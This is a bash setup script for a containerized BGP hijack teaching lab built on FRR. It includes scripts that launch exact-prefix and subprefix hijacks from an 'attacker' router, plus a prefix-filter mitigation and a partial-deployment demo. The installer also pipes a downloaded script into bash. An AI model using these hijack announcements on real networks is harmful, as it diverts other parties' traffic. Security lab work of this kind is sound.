#!/bin/bash
# =============================================================
# bootstrap.sh — Full setup for BGP Hijack Lab
# Run on a FRESH Ubuntu 22.04 VM:
#   sudo bash bootstrap.sh
# =============================================================

set -e

RED="\033[31m"; GREEN="\033[32m"; YELLOW="\033[33m"
CYAN="\033[36m"; BOLD="\033[1m"; RESET="\033[0m"

info()    { echo -e "${CYAN}[INFO]${RESET}  $*"; }
success() { echo -e "${GREEN}[OK]${RESET}    $*"; }
warn()    { echo -e "${YELLOW}[WARN]${RESET}  $*"; }
error()   { echo -e "${RED}[ERROR]${RESET} $*"; exit 1; }
section() { echo -e "\n${BOLD}━━━  $*  ━━━${RESET}"; }

if [ "$EUID" -ne 0 ]; then
  error "Please run as root: sudo bash bootstrap.sh"
fi

REAL_USER="${SUDO_USER:-$USER}"
REAL_HOME=$(eval echo "~$REAL_USER")
LAB_DIR="$REAL_HOME/bgp-hijack-lab"

echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║       BGP Hijack Lab — Bootstrap Installer       ║"
echo "║       Ubuntu 22.04  |  Containerlab + FRR        ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${RESET}"

# ── Step 1: System packages ───────────────────────────────────
section "Step 1 / 7 — System Update"
apt-get update -qq
apt-get install -y -qq \
  curl wget git unzip tcpdump wireshark-common \
  net-tools iproute2 iputils-ping \
  ca-certificates gnupg lsb-release jq tree
success "System packages installed"

# ── Step 2: Docker ────────────────────────────────────────────
section "Step 2 / 7 — Install Docker"
if command -v docker &>/dev/null; then
  warn "Docker already installed — skipping"
else
  install -m 0755 -d /etc/apt/keyrings
  curl -fsSL https://download.docker.com/linux/ubuntu/gpg \
    | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
  chmod a+r /etc/apt/keyrings/docker.gpg
  echo \
    "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
    https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" \
    > /etc/apt/sources.list.d/docker.list
  apt-get update -qq
  apt-get install -y -qq docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
  systemctl enable docker --quiet
  systemctl start docker
  success "Docker installed"
fi
if ! groups "$REAL_USER" | grep -q docker; then
  usermod -aG docker "$REAL_USER"
  warn "Added $REAL_USER to docker group — log out/in or run: newgrp docker"
fi

# ── Step 3: Containerlab ──────────────────────────────────────
section "Step 3 / 7 — Install Containerlab"
if command -v containerlab &>/dev/null; then
  warn "Containerlab already installed — skipping"
else
  bash -c "$(curl -sL https://get.containerlab.dev)" -- -v 0.54.2
  success "Containerlab installed"
fi

# ── Step 4: FRR image ─────────────────────────────────────────
section "Step 4 / 7 — Pull FRR Docker Image"
FRR_IMAGE="quay.io/frrouting/frr:9.1.0"
if docker image inspect "$FRR_IMAGE" &>/dev/null; then
  warn "FRR image already present — skipping"
else
  info "Pulling $FRR_IMAGE (this may take a few minutes)..."
  docker pull "$FRR_IMAGE"
  success "FRR image pulled"
fi

# ── Step 5: Lab files ─────────────────────────────────────────
section "Step 5 / 7 — Set Up Lab Directory"

if [ -d "$LAB_DIR" ]; then
  BACKUP="${LAB_DIR}.bak.$(date +%Y%m%d_%H%M%S)"
  warn "Lab directory exists — backing up to $BACKUP"
  mv "$LAB_DIR" "$BACKUP"
fi

mkdir -p "$LAB_DIR"/{configs/{r1,r2,r3,r4},scripts}

# ── topology.yaml ─────────────────────────────────────────────
cat > "$LAB_DIR/topology.yaml" << 'TOPOLOGY'
name: bgp-hijack

topology:
  nodes:
    r1:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r1/frr.conf:/etc/frr/frr.conf
        - configs/r1/daemons:/etc/frr/daemons
        - configs/r1/vtysh.conf:/etc/frr/vtysh.conf
    r2:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r2/frr.conf:/etc/frr/frr.conf
        - configs/r2/daemons:/etc/frr/daemons
        - configs/r2/vtysh.conf:/etc/frr/vtysh.conf
    r3:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r3/frr.conf:/etc/frr/frr.conf
        - configs/r3/daemons:/etc/frr/daemons
        - configs/r3/vtysh.conf:/etc/frr/vtysh.conf
    r4:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r4/frr.conf:/etc/frr/frr.conf
        - configs/r4/daemons:/etc/frr/daemons
        - configs/r4/vtysh.conf:/etc/frr/vtysh.conf
  links:
    - endpoints: ["r1:eth1", "r2:eth1"]
    - endpoints: ["r2:eth2", "r3:eth1"]
    - endpoints: ["r1:eth2", "r4:eth1"]
TOPOLOGY

# ── daemons + vtysh.conf ──────────────────────────────────────
DAEMONS="zebra=yes
bgpd=yes
ospfd=no
ospf6d=no
ripd=no
ripngd=no
isisd=no
pimd=no
ldpd=no
nhrpd=no
eigrpd=no
babeld=no
sharpd=no
pbrd=no
bfdd=no
fabricd=no
vrrpd=no
pathd=no"

for r in r1 r2 r3 r4; do
  printf '%s\n' "$DAEMONS" > "$LAB_DIR/configs/$r/daemons"
  echo "service integrated-vtysh-config" > "$LAB_DIR/configs/$r/vtysh.conf"
done

# ── R1 frr.conf (AS100 - Observer) ───────────────────────────
cat > "$LAB_DIR/configs/r1/frr.conf" << 'R1'
frr version 9.1
frr defaults traditional
hostname r1
no ipv6 forwarding
log syslog informational
!
interface lo
 ip address 1.1.1.1/32
 ip address 11.0.0.1/24
!
interface eth1
 description link-to-R2-AS200
 ip address 10.12.0.1/30
!
interface eth2
 description link-to-R4-AS400-ATTACKER
 ip address 10.14.0.1/30
!
router bgp 100
 bgp router-id 1.1.1.1
 no bgp ebgp-requires-policy
 no bgp network import-check
 network 11.0.0.0/24
 neighbor 10.12.0.2 remote-as 200
 neighbor 10.12.0.2 description R2-AS200-transit
 neighbor 10.12.0.2 ebgp-multihop 2
 neighbor 10.12.0.2 timers 5 15
 neighbor 10.14.0.2 remote-as 400
 neighbor 10.14.0.2 description R4-AS400-ATTACKER
 neighbor 10.14.0.2 ebgp-multihop 2
 neighbor 10.14.0.2 timers 5 15
 !
 address-family ipv4 unicast
  neighbor 10.12.0.2 activate
  neighbor 10.14.0.2 activate
 exit-address-family
!
ip route 11.0.0.0/24 null0
!
line vty
!
R1

# ── R2 frr.conf (AS200 - Transit) ────────────────────────────
cat > "$LAB_DIR/configs/r2/frr.conf" << 'R2'
frr version 9.1
frr defaults traditional
hostname r2
no ipv6 forwarding
log syslog informational
!
interface lo
 ip address 2.2.2.2/32
 ip address 12.0.0.1/24
!
interface eth1
 description link-to-R1-AS100
 ip address 10.12.0.2/30
!
interface eth2
 description link-to-R3-AS300-VICTIM
 ip address 10.23.0.1/30
!
router bgp 200
 bgp router-id 2.2.2.2
 no bgp ebgp-requires-policy
 no bgp network import-check
 network 12.0.0.0/24
 neighbor 10.12.0.1 remote-as 100
 neighbor 10.12.0.1 description R1-AS100
 neighbor 10.12.0.1 ebgp-multihop 2
 neighbor 10.12.0.1 timers 5 15
 neighbor 10.23.0.2 remote-as 300
 neighbor 10.23.0.2 description R3-AS300-victim
 neighbor 10.23.0.2 ebgp-multihop 2
 neighbor 10.23.0.2 timers 5 15
 !
 address-family ipv4 unicast
  neighbor 10.12.0.1 activate
  neighbor 10.23.0.2 activate
 exit-address-family
!
ip route 12.0.0.0/24 null0
!
line vty
!
R2

# ── R3 frr.conf (AS300 - Victim) ─────────────────────────────
cat > "$LAB_DIR/configs/r3/frr.conf" << 'R3'
frr version 9.1
frr defaults traditional
hostname r3
no ipv6 forwarding
log syslog informational
!
interface lo
 ip address 3.3.3.3/32
 ip address 13.0.0.1/24
!
interface eth1
 description link-to-R2-AS200-transit
 ip address 10.23.0.2/30
!
router bgp 300
 bgp router-id 3.3.3.3
 no bgp ebgp-requires-policy
 no bgp network import-check
 network 13.0.0.0/24
 neighbor 10.23.0.1 remote-as 200
 neighbor 10.23.0.1 description R2-AS200-transit
 neighbor 10.23.0.1 ebgp-multihop 2
 neighbor 10.23.0.1 timers 5 15
 !
 address-family ipv4 unicast
  neighbor 10.23.0.1 activate
 exit-address-family
!
ip route 13.0.0.0/24 null0
!
line vty
!
R3

# ── R4 frr.conf (AS400 - Attacker) ───────────────────────────
cat > "$LAB_DIR/configs/r4/frr.conf" << 'R4'
frr version 9.1
frr defaults traditional
hostname r4
no ipv6 forwarding
log syslog informational
!
interface lo
 ip address 4.4.4.4/32
 ip address 14.0.0.1/24
!
interface eth1
 description link-to-R1-AS100
 ip address 10.14.0.2/30
!
router bgp 400
 bgp router-id 4.4.4.4
 no bgp ebgp-requires-policy
 no bgp network import-check
 network 14.0.0.0/24
 neighbor 10.14.0.1 remote-as 100
 neighbor 10.14.0.1 description R1-AS100-target
 neighbor 10.14.0.1 ebgp-multihop 2
 neighbor 10.14.0.1 timers 5 15
 !
 address-family ipv4 unicast
  neighbor 10.14.0.1 activate
 exit-address-family
!
ip route 14.0.0.0/24 null0
!
line vty
!
R4

# ── Scripts ───────────────────────────────────────────────────
cat > "$LAB_DIR/scripts/verify.sh" << 'EOF'
#!/bin/bash
LAB="bgp-hijack"
R1="clab-${LAB}-r1"; R2="clab-${LAB}-r2"
R3="clab-${LAB}-r3"; R4="clab-${LAB}-r4"
BOLD="\033[1m"; GREEN="\033[32m"; YELLOW="\033[33m"; CYAN="\033[36m"; RESET="\033[0m"
run() { docker exec "$1" vtysh -c "$2" 2>/dev/null; }
echo -e "${BOLD}================================================${RESET}"
echo -e "${BOLD} BGP Hijack Lab — Verification${RESET}"
echo -e "${BOLD}================================================${RESET}"
echo -e "\n${CYAN}[R1 AS100] BGP Summary${RESET}";        run "$R1" "show bgp summary"
echo -e "\n${CYAN}[R1 AS100] BGP Table${RESET}";          run "$R1" "show bgp ipv4 unicast"
echo -e "\n${CYAN}[R2 AS200] BGP Table${RESET}";          run "$R2" "show bgp ipv4 unicast"
echo -e "\n${CYAN}[R3 AS300 VICTIM] BGP Table${RESET}";   run "$R3" "show bgp ipv4 unicast"
echo -e "\n${CYAN}[R4 AS400 ATTACKER] BGP Table${RESET}"; run "$R4" "show bgp ipv4 unicast"
echo -e "\n${CYAN}[R1] IP Routing Table${RESET}";         run "$R1" "show ip route"
echo -e "\n${BOLD}================================================${RESET}"
echo -e "${GREEN}Legitimate path: R1 → R2(AS200) → R3(AS300) | AS path: 200 300${RESET}"
echo -e "${BOLD}================================================${RESET}"
EOF

cat > "$LAB_DIR/scripts/start_exact_hijack.sh" << 'EOF'
#!/bin/bash
LAB="bgp-hijack"; R4="clab-${LAB}-r4"; R1="clab-${LAB}-r1"
BOLD="\033[1m"; RED="\033[31m"; YELLOW="\033[33m"; GREEN="\033[32m"; RESET="\033[0m"
echo -e "${BOLD}${RED}[ATTACK] Exact Prefix Hijack — AS400 announcing 13.0.0.0/24${RESET}"
docker exec "$R4" vtysh \
  -c "configure terminal" -c "router bgp 400" \
  -c "network 13.0.0.0/24" -c "end" -c "write memory"
docker exec "$R4" ip route add 13.0.0.0/24 via 127.0.0.1 dev lo 2>/dev/null || true
echo "Waiting 10s for BGP convergence..."; sleep 10
echo -e "\n${YELLOW}--- R1 Full BGP Table ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast"
echo -e "\n${YELLOW}--- R1 specific lookup ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"
echo -e "\n${RED}Expected: next hop via 10.14.0.2 (AS400) — HIJACKED${RESET}"
echo -e "${GREEN}Run scripts/stop_attack.sh to restore${RESET}"
EOF

cat > "$LAB_DIR/scripts/start_subprefix_hijack.sh" << 'EOF'
#!/bin/bash
LAB="bgp-hijack"; R4="clab-${LAB}-r4"; R1="clab-${LAB}-r1"
BOLD="\033[1m"; RED="\033[31m"; YELLOW="\033[33m"; GREEN="\033[32m"; RESET="\033[0m"
echo -e "${BOLD}${RED}[ATTACK] Subprefix Hijack — AS400 announcing 13.0.0.0/25${RESET}"
docker exec "$R4" vtysh \
  -c "configure terminal" -c "router bgp 400" \
  -c "no network 13.0.0.0/24" \
  -c "network 13.0.0.0/25" -c "end" -c "write memory" 2>/dev/null || true
docker exec "$R4" ip route add 13.0.0.0/25 via 127.0.0.1 dev lo 2>/dev/null || true
echo "Waiting 10s for BGP convergence..."; sleep 10
echo -e "\n${YELLOW}--- R1 Full BGP Table (both routes coexist) ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast"
echo -e "\n${YELLOW}--- Attacker /25 detail ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/25"
echo -e "\n${YELLOW}--- Victim /24 still present ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"
echo -e "\n${RED}Traffic to 13.0.0.0-13.0.0.127 → ATTACKER (longer prefix wins)${RESET}"
echo -e "${GREEN}Run scripts/stop_attack.sh to restore${RESET}"
EOF

cat > "$LAB_DIR/scripts/stop_attack.sh" << 'EOF'
#!/bin/bash
LAB="bgp-hijack"; R4="clab-${LAB}-r4"; R1="clab-${LAB}-r1"
BOLD="\033[1m"; GREEN="\033[32m"; YELLOW="\033[33m"; RESET="\033[0m"
echo -e "${BOLD}${GREEN}[STOP] Withdrawing all hijacked routes from AS400${RESET}"
docker exec "$R4" vtysh \
  -c "configure terminal" -c "router bgp 400" \
  -c "no network 13.0.0.0/24" \
  -c "no network 13.0.0.0/25" \
  -c "end" -c "write memory"
docker exec "$R4" ip route del 13.0.0.0/24 dev lo 2>/dev/null || true
docker exec "$R4" ip route del 13.0.0.0/25 dev lo 2>/dev/null || true
echo "Waiting 10s for BGP convergence..."; sleep 10
echo -e "\n${YELLOW}--- R1 BGP Table (restored) ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast"
echo -e "\n${GREEN}Expected: 13.0.0.0/24 via AS path 200 300 (legitimate)${RESET}"
EOF

cat > "$LAB_DIR/scripts/apply_mitigation.sh" << 'EOF'
#!/bin/bash
LAB="bgp-hijack"; R1="clab-${LAB}-r1"
BOLD="\033[1m"; CYAN="\033[36m"; GREEN="\033[32m"; RESET="\033[0m"
echo -e "${BOLD}${CYAN}[MITIGATION] Applying ROV-style filter on R1${RESET}"
docker exec "$R1" vtysh \
  -c "configure terminal" \
  -c "ip prefix-list LEGIT_VICTIM seq 5 permit 13.0.0.0/24" \
  -c "ip prefix-list LEGIT_VICTIM seq 10 deny 13.0.0.0/8 le 32" \
  -c "route-map VALIDATE_R4_IN permit 10" \
  -c " match ip address prefix-list LEGIT_VICTIM" \
  -c "route-map VALIDATE_R4_IN deny 20" \
  -c "router bgp 100" \
  -c " neighbor 10.14.0.2 route-map VALIDATE_R4_IN in" \
  -c "end" \
  -c "clear bgp 10.14.0.2 soft in" \
  -c "write memory"
echo -e "${GREEN}[OK] Mitigation applied on R1${RESET}"
EOF

cat > "$LAB_DIR/scripts/remove_mitigation.sh" << 'EOF'
#!/bin/bash
LAB="bgp-hijack"; R1="clab-${LAB}-r1"
BOLD="\033[1m"; YELLOW="\033[33m"; RESET="\033[0m"
echo -e "${BOLD}${YELLOW}[MITIGATION] Removing filter from R1${RESET}"
docker exec "$R1" vtysh \
  -c "configure terminal" \
  -c "router bgp 100" \
  -c " no neighbor 10.14.0.2 route-map VALIDATE_R4_IN in" \
  -c "end" \
  -c "no route-map VALIDATE_R4_IN" \
  -c "no ip prefix-list LEGIT_VICTIM" \
  -c "clear bgp 10.14.0.2 soft in" \
  -c "write memory"
echo -e "${YELLOW}[OK] Mitigation removed${RESET}"
EOF

cat > "$LAB_DIR/scripts/partial_deployment_demo.sh" << 'EOF'
#!/bin/bash
LAB="bgp-hijack"
R1="clab-${LAB}-r1"; R2="clab-${LAB}-r2"; R4="clab-${LAB}-r4"
BOLD="\033[1m"; RED="\033[31m"; GREEN="\033[32m"; YELLOW="\033[33m"; CYAN="\033[36m"; RESET="\033[0m"
echo -e "${BOLD}================================================${RESET}"
echo -e "${BOLD}  NOVELTY DEMO: Partial Deployment Failure${RESET}"
echo -e "${BOLD}================================================${RESET}"
echo -e "Scenario: Only R1 deploys ROV. R2 (transit) has none."
echo ""
echo -e "${CYAN}Phase 1 — Apply mitigation on R1 only${RESET}"
bash "$(dirname "$0")/apply_mitigation.sh"
echo ""
echo -e "${CYAN}Phase 2 — Launch exact prefix hijack${RESET}"
docker exec "$R4" vtysh \
  -c "configure terminal" -c "router bgp 400" \
  -c "network 13.0.0.0/24" -c "end" -c "write memory"
docker exec "$R4" ip route add 13.0.0.0/24 via 127.0.0.1 dev lo 2>/dev/null || true
echo "Waiting 15s for BGP convergence..."; sleep 15
echo -e "\n${YELLOW}--- R1 BGP (R1 IS protected) ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"
echo -e "\n${YELLOW}--- R2 BGP (R2 is NOT protected) ---${RESET}"
docker exec "$R2" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"
echo ""
echo -e "${BOLD}================================================${RESET}"
echo -e "${GREEN}R1 (protected):   Rejects AS400 hijack ✓${RESET}"
echo -e "${RED}R2 (unprotected): Still accepts AS400 hijack ✗${RESET}"
echo -e "${RED}Traffic via R2 still reaches the attacker${RESET}"
echo ""
echo -e "${BOLD}Finding: Partial ROV deployment is insufficient.${RESET}"
echo -e "Universal adoption required for full protection."
echo -e "(Aligns with ROV++ partial deployment findings)"
echo -e "${BOLD}================================================${RESET}"
echo ""
echo -e "${CYAN}Cleaning up...${RESET}"
bash "$(dirname "$0")/stop_attack.sh"
bash "$(dirname "$0")/remove_mitigation.sh"
echo -e "${GREEN}Lab restored to clean state.${RESET}"
EOF

cat > "$LAB_DIR/scripts/capture_bgp.sh" << 'EOF'
#!/bin/bash
LAB="bgp-hijack"; R1="clab-${LAB}-r1"
TIMESTAMP=$(date +%Y%m%d_%H%M%S); OUTPUT="bgp_capture_${TIMESTAMP}.pcap"
echo "Capturing BGP (port 179) on R1 → ${OUTPUT}"
echo "Trigger attack in another terminal, then Ctrl+C to stop."
docker exec "$R1" tcpdump -i any -w - port 179 2>/dev/null > "$OUTPUT"
echo "Saved: ${OUTPUT} — view with: wireshark ${OUTPUT}"
EOF

chmod +x "$LAB_DIR/scripts/"*.sh
chown -R "$REAL_USER":"$REAL_USER" "$LAB_DIR"
success "All lab files written"

# ── Step 6: Verify ────────────────────────────────────────────
section "Step 6 / 7 — Verify Installation"
info "Docker:        $(docker --version)"
info "Containerlab:  $(containerlab version 2>/dev/null | grep version | head -1 || echo installed)"
info "FRR image:     $(docker images quay.io/frrouting/frr --format '{{.Repository}}:{{.Tag}}' | head -1)"
info "Lab directory: $LAB_DIR"
tree "$LAB_DIR" 2>/dev/null || find "$LAB_DIR" -not -path '*/\.*' | sort

# ── Step 7: Snapshot reminder ─────────────────────────────────
section "Step 7 / 7 — Snapshot Reminder"
warn "Take a VM snapshot NOW before deploying the lab"
warn "VirtualBox: Machine → Take Snapshot → 'clean-install'"

echo ""
echo -e "${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}║              Setup Complete!                     ║${RESET}"
echo -e "${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "  ${BOLD}Deploy the lab:${RESET}"
echo -e "  ${GREEN}cd $LAB_DIR${RESET}"
echo -e "  ${GREEN}sudo containerlab deploy -t topology.yaml${RESET}"
echo -e "  ${GREEN}bash scripts/verify.sh${RESET}"
echo ""
echo -e "  ${BOLD}Attacks:${RESET}"
echo -e "  ${RED}bash scripts/start_exact_hijack.sh${RESET}"
echo -e "  ${RED}bash scripts/start_subprefix_hijack.sh${RESET}"
echo -e "  ${YELLOW}bash scripts/stop_attack.sh${RESET}"
echo ""
echo -e "  ${BOLD}Mitigation + novelty:${RESET}"
echo -e "  ${CYAN}bash scripts/apply_mitigation.sh${RESET}"
echo -e "  ${CYAN}bash scripts/partial_deployment_demo.sh${RESET}"
echo ""
echo -e "  ${BOLD}Teardown:${RESET}"
echo -e "  ${YELLOW}sudo containerlab destroy -t topology.yaml${RESET}"
